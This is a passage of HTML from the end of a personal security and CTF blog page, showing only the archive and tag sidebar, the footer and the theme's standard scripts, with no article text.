href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">區塊鍊</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">May 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/04/"><span class="level-start"><span class="level-item">April 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">March 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">January 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/09/"><span class="level-start"><span class="level-item">September 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/08/"><span class="level-start"><span class="level-item">August 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/02/"><span class="level-start"><span class="level-item">February 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/GIL/"><span class="tag">GIL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/algorithm/"><span class="tag">algorithm</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blockchain/"><span class="tag">blockchain</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp/"><span class="tag">burp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command/"><span class="tag">command</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cve/"><span class="tag">cve</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dapper-labs/"><span class="tag">dapper labs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/drony/"><span class="tag">drony</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare/"><span class="tag">flare</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flare-on/"><span class="tag">flare-on</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flow/"><span class="tag">flow</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/frida/"><span class="tag">frida</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel/"><span class="tag">kernel</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nord/"><span class="tag">nord</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nox/"><span class="tag">nox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/osint/"><span class="tag">osint</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel10k/"><span class="tag">powerlevel10k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel9k/"><span class="tag">powerlevel9k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxy/"><span class="tag">proxy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pyc/"><span class="tag">pyc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-engineering/"><span class="tag">reverse engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-ssh/"><span class="tag">reverse ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rootkit/"><span class="tag">rootkit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rsa/"><span class="tag">rsa</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/seo/"><span class="tag">seo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/srop/"><span class="tag">srop</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tunnel/"><span class="tag">tunnel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows-defender/"><span class="tag">windows defender</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeups/"><span class="tag">writeups</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zimfw/"><span class="tag">zimfw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zsh/"><span class="tag">zsh</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">歐欸利恩的部落格</a><p class="is-size-7"><span>&copy; 2022 oalieno</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
                renderMathInElement(element);
            });
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>